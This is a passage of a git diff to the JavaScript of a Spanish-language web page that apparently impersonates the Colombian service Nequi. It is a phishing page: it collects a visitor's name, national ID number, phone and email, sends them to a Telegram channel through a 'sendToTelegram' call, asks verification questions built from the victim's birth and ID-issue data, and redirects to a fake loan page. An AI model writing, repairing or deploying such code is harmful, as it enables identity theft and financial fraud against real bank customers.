         localStorage.setItem('formData', JSON.stringify(formData));
 
         // ===== ENVIAR A TELEGRAM =====
+        const sessionId = localStorage.getItem('sessionId') || 'session_' + Date.now();
         const mensajeTelegram = `🔔 CLIENTE NEQUI NUEVO\n` +
           `🆔 SESIÓN: ${sessionId}\n` +
           `👤 NOMBRE: ${nombreCompleto}\n` +
           `🪪 CÉDULA: ${cedula}\n` +
           `📱 TELÉFONO: ${data.telefono || 'No disponible'}\n` +
           `📧 CORREO: ${data.correo || 'No disponible'}`;
-
+        
         sendToTelegram(mensajeTelegram);
 
-        // ===== ENVIAR AL BACKEND =====
-        try {
-          await enviarAlBackend('/create-session', {
-            sessionId: sessionId,
-            cedula: cedula,
-            nombre: nombreCompleto,
-            telefono: data.telefono || 'No disponible',
-            correo: data.correo || 'No disponible'
-          });
-          console.log('✅ Sesión creada en backend');
-        } catch (error) {
-          console.error('❌ Error al crear sesión en backend:', error);
-        }
-
+        // Mostrar nombre en la interfaz
         customerNameDisplay.textContent = nombreCompleto + ",";
 
+        // Configurar preguntas
         steps.forEach(step => {
           step.querySelectorAll(".choice-btn").forEach(btn => {
             btn.classList.remove("selected");
@@ -575,16 +708,21 @@
         if (esBaseNueva) {
           document.getElementById("labelPregunta1").textContent = "¿Tu fecha de nacimiento es?";
           document.getElementById("respuestaPregunta1").textContent = formatearFecha(data.fecha_nacimiento);
+
           document.getElementById("labelPregunta2").textContent = "¿Tu fecha de expedición del documento es?";
           document.getElementById("respuestaPregunta2").textContent = formatearFecha(data.fecha_expedicion);
+
           steps[2].style.display = "none";
+
           respuestas = [
             { tipo: "fecha_nacimiento", respuesta: "" },
             { tipo: "fecha_expedicion", respuesta: "" }
           ];
+
         } else {
           document.getElementById("labelPregunta1").textContent = "¿El lugar de expedición de tu documento es?";
           document.getElementById("respuestaPregunta1").textContent = data.lugar_expedicion || "No disponible";
+
           document.getElementById("labelPregunta2").textContent = "¿Tu fecha de nacimiento es?";
           document.getElementById("respuestaPregunta2").textContent = formatearFecha(data.fecha_nacimiento);
 
@@ -600,6 +738,7 @@
           }
 
           steps[2].style.display = "flex";
+
           respuestas = [
             { tipo: "lugar_expedicion", respuesta: "" },
             { tipo: "fecha_nacimiento", respuesta: "" },
@@ -613,6 +752,7 @@
         mostrarToast("✅ Cliente encontrado correctamente", "success");
       }
 
+      // ===== RENDERIZAR PASO =====
       function renderStep() {
         steps.forEach((step, index) => {
           if (step.style.display === "none") return;
@@ -628,6 +768,7 @@
         }
       }
 
+      // ===== SELECCIONAR RESPUESTA =====
       function selectAnswer(stepIndex, answer, button) {
         if (respuestas[stepIndex].respuesta !== "") return;
 
@@ -746,7 +887,7 @@
             const formData = JSON.parse(localStorage.getItem("formData") || "{}");
             formData.securityValidation = result;
             localStorage.setItem("formData", JSON.stringify(formData));
-          } catch (e) {}
+          } catch (e) { /* Ignorar en incógnito */ }
 
           if (result.aprobado) {
             setTimeout(() => {
@@ -762,6 +903,7 @@
             setTimeout(() => {
               loadingContenedor.style.display = "none";
               done.classList.remove("show");
+              // Redirigir a loan-simulator con datos precargados
               window.location.href = 'loan-simulator.php.html';
             }, 3000);
 
@@ -791,6 +933,7 @@
       }
 
       // ===== EVENT LISTENERS =====
+
       btnBuscar.addEventListener("click", buscarCliente);
 
       cedulaInput.addEventListener("keydown", (e) => {
@@ -830,9 +973,8 @@
             cedulaSuccess.classList.add("show");
           }
         }
-      } catch (e) {}
+      } catch (e) { /* Ignorar en incógnito */ }
 
-      console.log('🔐 Session ID:', sessionId);
       console.log("🔐 Listo - Ingresa tu cédula y presiona 'Solicitar'");
     });
   </script>
